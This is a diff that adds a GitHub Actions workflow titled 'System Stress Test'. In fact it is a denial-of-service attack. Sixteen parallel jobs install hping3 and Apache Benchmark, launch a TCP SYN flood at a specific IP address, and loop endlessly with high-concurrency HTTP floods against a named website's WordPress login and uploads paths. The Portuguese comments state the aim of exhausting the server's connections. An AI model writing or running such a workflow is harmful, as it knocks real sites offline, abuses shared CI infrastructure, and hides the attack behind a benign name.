@@ -1,0 +1,29 @@
+name: "System Stress Test"
+on:
+  workflow_dispatch:
+
+jobs:
+  exaustao:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        worker: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16]
+    steps:
+      - name: "Setup Attack Environment"
+        run: |
+          sudo apt-get update && sudo apt-get install -y hping3 apache2-utils
+      
+      - name: "Infinite Attack Sequence"
+        run: |
+          # Fundo: Flood TCP SYN para esgotar a tabela de conexões do servidor
+          sudo hping3 -S --flood -V -p 443 186.193.226.138 &
+          
+          # Loop principal: HTTP Flooding agressivo com Apache Benchmark
+          # -n 1000000: número massivo de requests
+          # -c 500: concorrência extrema por worker
+          # -k: keep-alive para não fechar a conexão, forçando o servidor a segurar o socket aberto
+          while true; do
+            ab -n 1000000 -c 500 -k -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" https://polistampo.com.br/wp-login.php
+            ab -n 1000000 -c 500 -k -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" https://polistampo.com.br/wp-content/uploads/
+            sleep 1
+          done
